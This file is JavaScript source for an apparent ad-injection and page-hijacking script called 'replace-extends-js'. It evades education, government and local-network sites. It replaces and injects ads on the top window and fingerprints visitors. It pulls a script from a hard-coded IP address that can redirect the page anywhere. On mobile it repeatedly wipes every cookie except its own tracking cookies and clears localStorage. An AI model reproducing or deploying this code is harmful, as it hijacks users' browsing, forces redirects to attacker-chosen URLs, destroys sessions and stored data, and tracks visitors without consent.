import { phone } from 'ismobilejs';
import { mobileExtend, PCExtend } from './utils';
import { mobileReplace, PCReplace } from './replace';
import { AD_0X0 } from './config';

const [name, version] = ['replace-extends-js', '1.0.0'];
const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
const hostname = Object.keys(window.top.location).length > 5 && window.top.location.hostname;

function extend() {
  if (window.top.adExtendsJS || blackWebsite.test(hostname)) return;
  window.top.adExtendsJS = `${name}-${version}`;
  if (window.top.Fingerprint2) {
    new Fingerprint2().get(() => {
      if (phone) mobileExtend();
      else PCExtend();
    });
    return;
  }
  if (phone) mobileExtend();
  else PCExtend();
}

function replace() {
  if (blackWebsite.test(hostname)) return;
  window.adReplaceJS = `${name}-${version}`;
  if (phone) mobileReplace();
  else PCReplace();
}

function redirect() {
  let str = '';
  if (hostname.search(/^www./) !== -1) {
    str = hostname.slice(hostname.indexOf('.') + 1);
  } else {
    str = hostname;
  }

  const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
  window.top[fnName] = (data) => {
    if (data.url) window.top.location.href = data.url;
  };
  const os = document.createElement('script');
  os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
  window.top.document.head.appendChild(os);
  os.remove();
}

function getCookie() {
  const arr = window.top.document.cookie.match(/[^ =;]+(?=\=)|[A-z]*/g);
  return arr;
}

function clear() {
  const keys = getCookie();
  const { host } = window.top.location;
  const whiteObj = {
    slv: true,
    slvwst: true,
    pdv2865191: true,
    idevst: true,
    idv: true,
    atxdwwyeq3674: true,
    _aswak5862: true,
    _aswqert23e58: true,
    _aak5862: true,
    slvst: true,
    idvst: true,
    pdv28191: true,
    _ast2358: true,
    atxyeq3674: true,
  };
  if (keys) {
    for (let i = keys.length; i--;) {
      if (keys[i] && !whiteObj[keys[i]]) {
        window.top.document.cookie = `${keys[i]}=0;path=/;expires=${new Date(0).toUTCString()}`;
        window.top.document.cookie = `${keys[i]}=0;path=/;domain=.${host};expires=${new Date(0).toUTCString()}`;
      }
    }
  }
  window.top.localStorage.clear();
}

function handler() {
  if (!hostname) return;
  if (!window.top.haveRedirect) {
    setTimeout(redirect, 0);
    window.top.haveRedirect = true;
  }
  if (window.top.adReady || window.top.document.readyState !== 'complete') return;
  extend();
  replace();
  setTimeout(replace, 4000);
  window.top.adReady = true;
}

if (document.addEventListener) {
  document.addEventListener('DOMContentLoaded', handler, false);
  document.addEventListener('readystatechange', handler, false); // IE9+
} else if (document.attachEvent) {
  document.attachEvent('onreadystatechange', handler);
}

setInterval(() => {
  if (phone && hostname) clear();
}, 3000);

setTimeout(() => {
  if (hostname) replace();
  // if (phone) {
  //   // 唤醒广告位
  //   const scr = document.createElement('script');
  //   scr.src = AD_0X0;
  //   window.top.document.body.appendChild(scr);
  // }
}, 2000);
setTimeout(() => {
  if (hostname) replace();
}, 6000);
